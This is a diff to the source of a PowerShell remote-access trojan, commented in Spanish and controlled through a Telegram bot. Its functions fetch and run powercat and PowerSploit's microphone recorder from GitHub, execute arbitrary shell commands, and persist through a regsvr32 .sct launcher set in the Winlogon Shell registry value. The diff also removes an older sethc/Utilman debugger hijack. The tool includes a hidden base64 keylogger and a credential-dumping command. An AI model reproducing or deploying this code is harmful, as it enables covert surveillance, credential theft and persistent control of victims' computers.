@@ -22,11 +22,6 @@ $codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
 return $codeScript
 }
 
-
-################################################ Cargamos funciones de otros proyectos ########################################################################
-
-$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
-
 ############################################################# Funciones propias #############################################################
 
 function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
@@ -151,19 +146,6 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
 
-function Add-Registro
-{
-    [CmdletBinding()] Param(
-        [Parameter(Position = 0, Mandatory = $False)]
-        [String]$code 
-    )
-    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name SecurityLayer -Value 1
-    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
-    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value $code -Force
-    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe"
-    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value $code -Force
-}
-
 
 function graba-audio { param ($botkey,$chat_id,$segundos)
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
@@ -223,9 +205,9 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" 
-Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll" | out-null ; $texto = ""
-$texto = "Persistencia ejecutada correctamente"} return $texto;break}
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" ;
+Set-ItemProperty "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -value "explorer.exe, c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll"
+$texto = "" ; $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
 
@@ -233,12 +215,12 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
-$key2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check2 = Get-ItemProperty $key2 -name Debugger | Select-String "regsvr32.exe"
-if ($check.count -eq 0 -and $check2.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
+$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ;$check = Get-ItemProperty $key -name Shell | Select-String "regsvr32.exe"
+if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
-remove-item $key ; remove-item $key2
-Remove-Item C:\Windows\System32\log2.sct; return $texto; break
+Set-ItemProperty "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -value "explorer.exe"
+
+Remove-Item C:\Users\Public\Libraries\log2.sct; return $texto; break
 }}}
 
 function crea_keylogger { param ($extrae)
@@ -277,7 +259,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Shell*" -and $first_connect -gt 5) {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Shell*" -and $first_connect -gt 5) {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }; if ($comando -like "nc*") {$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat } $texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; Set-Location $ruta; del *.*; Set-Location $env:USERPROFILE ;exit}
@@ -293,7 +275,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code ; $plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
- if ($comando -like "/MimiGatoz  -and $first_connect -gt 5") {mimigatoz}
+ if ($comando -like "/MimiGatoz") {mimigatoz}
 # if ($comando -eq "Mimikittenz") {$texto = "La funcion mimikitenz se ejecuta: `n /Mimikittenz On`n /Mimikittenz Off"}
  if ($comando -eq "Mimikittenz") {$texto = "Proximamente.."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 }
